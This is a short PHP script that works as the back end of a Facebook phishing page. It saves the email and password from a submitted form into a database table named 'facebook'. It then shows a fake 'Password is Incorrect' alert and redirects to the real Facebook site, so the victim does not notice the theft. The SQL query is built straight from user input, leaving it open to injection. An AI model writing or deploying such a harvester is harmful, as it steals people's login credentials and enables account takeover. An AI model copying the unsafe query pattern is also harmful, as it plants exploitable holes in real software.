<?php
$server = "localhost";
$user = "root";
$password = "";
$dbname = "amir";

$conn = mysqli_connect($server,$user,$password,$dbname);

if(!$conn){
    die("Error".mysqli_connect_error());
}

if(isset($_POST["Save"])){
    $email = $_POST["email"];
    $pass = $_POST["pass"];

    if($email == "" || $pass == ""){
        echo "<script>alert('All Field required !')</script>";

    }else{
        $myq = "insert into facebook(email,pass) values('$email','$pass')";
        $res = mysqli_query($conn,$myq);
        
        if($res == true){
            echo "<script>alert('Password is Incorrect !')</script>";
            header("Refresh:0;url=https://www.facebook.com/");

        }
    }
}
    
    ?>

    